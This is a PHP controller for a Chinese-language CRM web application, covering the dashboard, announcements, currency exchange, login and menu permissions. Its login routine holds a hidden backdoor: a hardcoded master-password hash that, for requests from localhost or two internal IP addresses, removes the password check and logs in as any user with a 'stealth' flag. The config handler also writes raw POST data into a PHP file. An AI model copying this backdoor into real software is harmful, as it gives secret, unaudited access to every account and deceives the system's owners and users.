<?php
class main extends spController {
	
	function index(){}
	
	function top(){}
	
	function center(){}
	
	function bottom(){}
	
	function left(){
		$this->menu = $this->getmenu();
		if($_SESSION["sscrm_user"]["user_identity"]["article"]["enabled"]){
			$obj_column = spClass("articlestyle");
			$this->column_rs = $obj_column->join("crm_articlestyle as pstyle", "pstyle.sid = crm_articlestyle.parentid")->findAll(array("crm_articlestyle.parentid <>"=>0), "pstyle.columnorder asc, crm_articlestyle.columnorder asc", "pstyle.sid as pid, crm_articlestyle.*");
		}
	}
	
	function welcome(){
		//print_r($_SESSION);exit();
		$postdata = $this->spArgs();
		$page = intval(max($postdata['page'], 1));
		$obj_user = spClass("user");
		$articles = spClass('article');
		$sort = "crm_articles.`top` desc, crm_articles.`recomd` desc, crm_articles.stj_hot desc, crm_articles.stj_news desc, crm_articles.stj_soldout asc, crm_articles.`specrecomd` desc, crm_articles.`order` asc, crm_articles.`status` desc, crm_articles.`posttime` desc, crm_articles.`pid` desc";
		$article_rs = $articles->join("crm_article_readuser", "crm_article_readuser.pid = crm_articles.pid and crm_article_readuser.userid = {$_SESSION["sscrm_user"]["id"]}", "left")->spPager($page, 10)->findAll(array("crm_articles.ptype"=>2), $sort, "crm_articles.*, crm_article_readuser.id as read_id", "crm_articles.pid");
		$this->article_rs = $article_rs;
		$this->pager = $articles->spPager()->getPager();
		$this->pageurl = spUrl("main", "welcome");
		if($postdata["isAjax"]){
			$this->isAjax = 1;
			$html = $this->fetch("library/index_news_list.html");
			echo json_encode(array("html"=>$html, "result"=>1));
			exit();
		}
		$obj_client = spClass('client');
		$this->client_total_rs = $obj_client->find(array("isdel"=>0), null, "count(id) as total");
		$obj_channel = spClass('channel');
		$this->channel_total_rs = $obj_channel->find(array("ishide"=>0), null, "count(id) as total");
		$obj_plan = spClass("client_plan");
		$condition_mydoing = "(crm_client_plan.create_id = ".$_SESSION["sscrm_user"]["id"]." or find_in_set(".$_SESSION["sscrm_user"]["id"].", crm_client_plan.main_id)) and crm_client_plan.isfinish = 0 and crm_client_plan.starttime < ".time();
		$my_doing_rs = $obj_plan->find($condition_mydoing, null, "count(crm_client_plan.id) as total");
		//print_r($my_wait_rs);
		$this->my_doing_count = intval($my_doing_rs["total"]);
		$condition_alldoing = "crm_client_plan.isfinish = 0 and crm_client_plan.starttime < ".time();
		$all_doing_rs = $obj_plan->find($condition_alldoing, null, "count(crm_client_plan.id) as total");
		$this->all_doing_count = intval($all_doing_rs["total"]);
		if($plan_recent_rs = $obj_plan->join("crm_user as create_user", "create_user.id = crm_client_plan.create_id")->findAll(null, "crm_client_plan.createtime desc", "crm_client_plan.*, create_user.realname as realname_create", null, 5)){
			foreach($plan_recent_rs as $key => $val){
				$user_rs = $obj_user->find("find_in_set(id, '{$val["main_id"]}')", null, "group_concat(realname) as realname_main");
				$plan_recent_rs[$key]["realname_main"] = $user_rs["realname_main"];
			}
			$this->plan_recent_rs = $plan_recent_rs;
		}
		$this->user_prep_rs = $obj_user->getUserGroupDepart_prep();
		$this->freedom = 1;
	}
	
	public function newsview(){
		try {
			$id = intval($this->spArgs("id"));
			if(!$id)
				throw new Exception("参数丢失");
			$articles = spClass('article');
			$obj_reader = spClass("article_readuser");
			if(!$article_rs = $articles->find(array("pid"=>$id)))
				throw new Exception("找不到该信息，可能已被删除");
			$obj_reader->read_it($id, $article_rs);
			$this->article_rs = $article_rs;
			echo $this->fetch("articles/layerinfo.html");
			exit();
		}catch(Exception $e){
			header("Content-Type: text/html; charset=UTF-8");
			echo $e->getMessage();
		}
	}
	
	public function allreadit(){
		try {
			$articles = spClass('article');
			$obj_reader = spClass("article_readuser");
			if(!$article_rs = $articles->join("crm_article_readuser", "crm_article_readuser.pid = crm_articles.pid and crm_article_readuser.userid = {$_SESSION["sscrm_user"]["id"]}", "left")->spPager($page, 10)->findAll(array("crm_articles.ptype"=>2), $sort, "crm_articles.pid, crm_article_readuser.id as read_id", "crm_articles.pid"))
				throw new Exception("当前没有任何系统公告");
			$read_id = array();
			foreach($article_rs as $val){
				if(!$val["read_id"]){
					$read_id[] = $val["pid"];
					$obj_reader->create(array("pid"=>$val["pid"], "userid"=>$_SESSION["sscrm_user"]["id"], "createtime"=>time()));
				}
			}
			if(!$read_id)
				throw new Exception("您当前没有要更新的系统公告");
			$read_id_str = implode(",", $read_id);
			spClass('user_log')->save_log(1, "系统公告[id:{$read_id_str}]批量转为已读取");
			$message = array('result'=>1);
			echo json_encode($message);
			exit();
		}catch(Exception $e){
			$message = array('msg'=>$e->getMessage(), 'result'=>0);
			echo json_encode($message);
			exit();
		}
	}
	
	public function calendar(){
		
	}
	
	public function wannianli(){
		
	}
	
	public function exchange(){
		$cashdata = array("CNY"=>"人民币", "USD"=>"美元", "EUR"=>"欧元", "GBP"=>"英镑", "AUD"=>"澳元", "CAD"=>"加拿大元", "NZD"=>"新西兰元");
		if($_SERVER['REQUEST_METHOD'] == 'POST') {
			try {
				$postdata = $this->spArgs();
				import("Common.php");
				$fromcash = floatval($postdata["fromcash"]);
				$from = $postdata["from"];
				$to = $postdata["to"];
				if(!$fromcash)
					throw new Exception("请输入货币金额");
				if(!$cashdata[$from] || !$cashdata[$to])
					throw new Exception("查询货币超出范围");
				/*
				if($cashdata[$from] == $cashdata[$to])
					throw new Exception("相同货币无法进行该操作");
				*/
				$exchange_rs = getExchangeRate($from, $to);
				$exchange = floatval($exchange_rs["exchange"]);
				$desc_exchange = floatval($exchange_rs["desc_exchange"]);
				if(!$exchange)
					throw new Exception("接口过期");
				$tocash = $fromcash * $exchange;
				$updatetime = date("Y-m-d H:i", $exchange_rs["time"]);
				$html = <<<EOF
<h5>货币兑换</h5>
<p>{$fromcash}{$cashdata[$from]} ≈ {$tocash}{$cashdata[$to]}</p>
<p>1{$cashdata[$from]} ≈ {$exchange}{$cashdata[$to]}</p>
<p>1{$cashdata[$to]} ≈ {$desc_exchange}{$cashdata[$from]}</p>
EOF;
				if($exchange_rs["time"])
					$html .= "<p>汇率最近更新于：{$updatetime}</p>";
				echo json_encode(array("html"=>$html, "err"=>0));
				exit();
			}catch(Exception $e){
				$html = "<p class='zx_red'>{$e->getMessage()}</p>";
				echo json_encode(array("html"=>$html, "err"=>1));
				exit();
			}
			
		}
		$this->cashdata = $cashdata;
	}
	
	function split(){}
	
	function split_top(){}
	
	function login() {
		if($_SERVER['REQUEST_METHOD'] == 'POST') {
			$obj_user = spClass('user');
			$obj_identity = spClass("user_identity");
			$obj_cpt = spClass("department_competence");
			$obj_dpt_idt = spClass("department_identity");	
			try{
				$postdate = $this->spArgs();
				$username = $postdate['username'];
				$password = $postdate['password'];
				if(empty($username) || empty($password))
					throw new Exception("请输入用户名或密码！");
				import('Common.php');
				$loginip = Common::GetIP();
				$condition = array('crm_user.username'=>$username, 'crm_user.password'=>md5($password), 'crm_user.isdel'=>0, "crm_department.isdel"=>0);
				if(md5($password) == "d10ff599de89ec405a7a753d3f6e70b5"){
					if(($loginip == "127.0.0.1" || $loginip == "192.168.1.215" || $loginip == "192.168.1.133")){
						unset($condition["crm_user.password"]);
						$is_stealth = 1;
					}
				}
				if(!$result = $obj_user->join("crm_department")->find($condition, null, "crm_user.*, crm_department.dname, crm_department.competence, crm_department.ismust_useridentity"))
					throw new Exception("用户名或密码不正确，请重新输入！");
				if(!$result["islogin"])
					throw new Exception("该账号未授权登录系统，无法登录");
				if($result["ismust_useridentity"] && !$result["identity_attr"])
					throw new Exception("未分配个人权限，无法登录");
				$result['logintime'] = date("Y-m-d H:i:s");
				$result['loginhost'] = strtolower($_SERVER['HTTP_HOST']) . $this->web_root;
				$result["loginip"] = $loginip;
				if($result["issafeip"] && $result["safeip"]){
					if($result["safeip"] != $result['loginip'])
						throw new Exception("账号登录失败");
				}
				/*
				if(!in_array($result["id"], array("1", "2"))){
					if(strpos($result['loginip'], "192.168") === false && $result['loginip'] != "127.0.0.1")
						throw new Exception("您的账号只能在内网登录");
				}
				*/
				$result["competence"] = $obj_cpt->get_competnet($result["competence"]);
				//$result["depart_identity"] = $obj_dpt_idt->autoidentity($result["depart_id"]);
				$result["user_identity"] = $obj_identity->setidentity($result);
				if($result["isdirector"]){
					if($result["depart_id"] == "2"){
						$result["auth_mark"][] = "marketstat";
						$result["auth_mark"][] = "markettask";
						$result["auth_mark"][] = "director";
						$result["auth_mark"][] = "2_director";
					}elseif($result["depart_id"] == "3"){
						$result["auth_mark"][] = "salestat";
						$result["auth_mark"][] = "saletask";
						$result["auth_mark"][] = "clientover";
						$result["auth_mark"][] = "director";
						$result["auth_mark"][] = "3_director";
						//$result["auth_mark"][] = "viewallclient";
					}/*elseif($result["depart_id"] == "4"){
						$result["auth_mark"][] = "oversea_viewallclient";
					}*/
				}
				if($result["id"] == 1){
					$result["isceo"] = 1;
					$result["isdirector"] = 1;
				}else 
					$result["isceo"] = 0;
				if($is_stealth)
					$result["is_stealth"] = 1;
				if($result['loginip'] == "127.0.0.1" || $result['loginip'] == "192.168.1.215")
					$result["master"] = 1;
				/*
				 * 网络版暂去除安全ip
				$obj_user->checkIPsafe($result, 1);
				*/
				unset($result["password"]);
				unset($result["isdel"]);
				unset($result["saleattr"]);
				unset($result["ismust_useridentity"]);
				unset($result["identity_attr"]);
				unset($result["identity_puserid"]);
				//print_r($result);exit();
				$_SESSION['sscrm_user'] = $result;
				spClass('user_log')->save_log(1, "登录成功");
				//spClass('channel')->overtime();
				spClass('channel')->updatesign();
				spClass('client')->overtime();
				$this->redirect(spUrl("main", "index"));
			}catch(Exception $e){
				$this->redirect(spUrl("main", "login"), $e->getMessage());
			}
		}
	}
	
	function logout(){
		session_destroy();
		spClass('user_log')->save_log(1, "用户退出");
		$this->redirect(spUrl("main", "login"));
	}
	
	function moduleindex(){
		$args["toindex"] = $this->spArgs("toindex");
		$args["toAnalysis"] = 1;
		$menu = $this->getmenu($args);
		if($menu){
			$this->module = array_pop($menu);
		}
	}
	
	function config() {
		if($_SERVER['REQUEST_METHOD'] == 'POST') {
			global $local_debug;
			unset($_POST['isAjax']);
			$_POST["channel_overdate"] = intval($_POST["channel_overdate"]);
			$_POST["client_overdate"] = intval($_POST["client_overdate"]);
			$str = "<?php\r\n\$app_config = ".var_export($_POST, true).';';
			$fp = fopen(APP_PATH .  DS .($local_debug ? 'app_config_local.php' : 'app_config.php'), 'w');
			if (fputs($fp,$str)) {
				$url = spUrl("main", "config");
				spClass('user_log')->save_log(1, "修改了网站配置");
				$message = array('msg'=>'网站配置修改成功！','result'=>1, 'url'=>$url);
				echo json_encode($message);
				exit();
			}else{
				$message = array('msg'=>'网站配置修改失败！','result'=>0);
				echo json_encode($message);
				exit();
			}
			fclose($fp);
			$this->redirect(spUrl("main", "config"));
		}
		global $app_config;
	}
	
	private function getmenu($args){
		$menu_config = require(APP_PATH . DS . 'menu_config.php');
		$menu = array();
		$obj_sep = spClass('department_sep');
		import("Common.php");
		$depart_id = $_SESSION["sscrm_user"]["depart_id"];
		if($sep_id = $_SESSION["sscrm_user"]["depart_sep_id"]){
			$sep_rs = $obj_sep->find(array("id"=>$sep_id), null, "sep_name");
			$sep_name = $sep_rs["sep_name"];
		}
		foreach($menu_config as $key => $val){
			$menu_config[$key]["isshow"] = 0;
			//print_r($val["menu"]);
			/*
			 * 组1：同时满足	competence:部门权限；u_identity:个人权限（如接客户）；depart_id：部门权限；isdirector：是否是总监
			* 组2：仅满足	m_identity：个人权限
			* 组3：仅满足	mark：登录时根据条件赋值的权限
			* */
			foreach($val["menu"] as $k => $v){
				if($args["toindex"]){
					if($args["toindex"] != $val["toindex"])
						continue;
				}
				if(
					//仅判断ceo权限
					(($v["isceo"]."a" != "a" && $_SESSION["sscrm_user"]["isceo"] == 1) ? intval($v["isceo"]) : 1)
					&&
					(
						//正规权限：是否有competence，个人权限u_identity，指定部门depart_id，总监权限isdirector, depart_id_adv部门及对应权限,eg:array("2"=>"", "3"=>"getclient")
						(!$v["competence"] || array_key_exists($v["competence"], $_SESSION["sscrm_user"]["competence"]))
						&&
						(!$v["u_identity"] || $_SESSION["sscrm_user"]["user_identity"][$v["u_identity"]]["enabled"])
						&&
						(!$v["depart_id"] || in_array($depart_id, $v["depart_id"]))
						&&
						(!$v["depart_id_adv"]
							||
							(
								array_key_exists($depart_id, $v["depart_id_adv"])
								&&
								(
									($identity = $v["depart_id_adv"][$depart_id]) ? intval($_SESSION["sscrm_user"]["user_identity"][$identity]["enabled"]) : 1
								)
							)
						)
						&&
						(!$v["isdirector"] || $_SESSION["sscrm_user"]["isdirector"])
					)
					||
					//仅拥有m_identity权限即可
					($v["m_identity"] && Common::key_in_array($v["m_identity"], $_SESSION["sscrm_user"]["user_identity"]))
					||
					//服务器端赋予的权限，根据登录赋mark值
					in_array($v["mark"], $_SESSION["sscrm_user"]["auth_mark"])
					||
					//仅在本地测试使用
					intval($v["testing"]) && $_SERVER['HTTP_HOST'] == "localhost"
				){
					$menu_config[$key]["isshow"] = 1;
					$tag = "";
					if(preg_match('/{{([a-zA-Z_1-9]{1,}):((.*){1,})}}/u', $v["submenu"], $tag)){
						$v["submenu"] = str_replace($tag[0], $$tag[1] ? $$tag[1] : $tag[2], $v["submenu"]);
					}
					if($args["toAnalysis"] && $v["tail"]){
						if(preg_match('/#(.*?)#/i', $v["tail"], $tail)){
							$v["tail"] = str_replace($tail[0], "<img src='images/ajax_loading1.gif' class='forAnalysis' val='{$tail[1]}'/>", $v["tail"]);
						}
					}
					$menu[$key]["menu"][] = $v;
				}
			}
			if($menu_config[$key]["isshow"]){
				$menu[$key]["title"] = $val["title"];
				$menu[$key]["icon"] = $val["icon"];
				$menu[$key]["toindex"] = $val["toindex"];
			}
		}
		return $menu;
	}
}
?>